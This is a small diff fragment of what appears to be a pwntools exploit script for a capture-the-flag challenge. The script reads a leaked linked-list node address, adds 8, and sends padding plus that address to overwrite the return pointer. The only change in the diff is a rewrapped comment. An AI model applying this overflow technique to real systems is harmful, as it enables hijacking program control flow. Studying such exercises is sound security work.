@@ -116,7 +116,8 @@ p.recvuntil("node.next:")
 node_2_addr = p.recvline()
 """
 we add 8 to the leaked address, because our input is at 
-offset 8 from the start of node 2 which is the leaked address, being the first 8 bytes reserved to the pointer to the next node on the list.
+offset 8 from the start of node 2 which is the leaked address, 
+being the first 8 bytes reserved to the pointer to the next node on the list.
 """
 rip = p64(int(node_2_addr, 16) + 8)
 p.sendline(padding + rip)
